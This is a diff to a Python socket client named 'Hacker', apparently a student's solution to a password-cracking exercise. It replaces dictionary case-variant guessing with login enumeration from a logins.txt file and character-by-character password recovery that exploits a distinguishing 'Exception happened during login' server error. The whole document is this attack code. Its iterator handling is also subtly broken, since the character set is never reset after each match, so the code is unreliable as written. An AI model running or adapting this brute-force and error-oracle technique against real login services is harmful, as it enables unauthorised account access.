@@ -2,6 +2,7 @@
 import socket
 import sys
 import itertools
+import json
 
 
 class Hacker(object):
@@ -15,25 +16,40 @@ class Hacker(object):
 
     def main(self):
         self.client_socket.connect(self.address)
+        keys = list(map(chr, range(97, 123)))
+        keys.extend(list(map(chr, range(48, 58))))
+        keys.extend(list(map(chr, range(65, 91))))
+        keys = itertools.chain(keys)
 
-        with open('c:\\Users\\Kolda2\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt',
-                  'r') as passwords:
-            while True:
-                pass_list = []
-                pass_seed = passwords.readline().rstrip('\n')
-                original = pass_seed
-                pass_seed = pass_seed.translate({ord(i): None for i in '0123456789'})
-                trials = list(map(''.join, itertools.product(*zip(pass_seed.upper(), pass_seed.lower()))))
-                for trial in trials:
-                    pass_list.append(original.translate({ord(y): trial[x] for x, y in enumerate(pass_seed)}))
-
-                for trial in pass_list:
-                    self.client_socket.send(trial.encode())
+        got_login = False
+        got_password = False
+        incomplete_pass = ''
+        with open('c:\\Users\\Kolda2\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt',
+                  'r') as admins:
+            while not got_password:
+                while not got_login:
+                    admin = admins.readline().rstrip('\n')
+                    credentials = {"login": admin, "password": None}
+                    self.client_socket.send(json.dumps(credentials).encode(encoding='UTF-16'))
                     response = self.client_socket.recv(1024)
-                    response = response.decode()
-                    if response == 'Connection success!':
-                        print(trial)
-                        return
+                    response = response.decode(encoding='UTF-16')
+                    response = json.loads(response)
+                    print(response['result'])
+                    if response['result'] == 'Wrong password!':
+                        got_login = True
+
+                pass_trial = incomplete_pass + next(keys)
+                credentials = {"login": admin, "password": pass_trial}
+                self.client_socket.send(json.dumps(credentials).encode(encoding='UTF-16'))
+                response = self.client_socket.recv(1024)
+                response = response.decode(encoding='UTF-16')
+                response = json.loads(response)
+
+                if response['result'] == 'Exception happened during login':
+                    incomplete_pass = pass_trial
+                    keys = itertools.chain(keys)
+                elif response['result'] == "Connection success!":
+                    return
 
     def closing(self):
         self.client_socket.close()
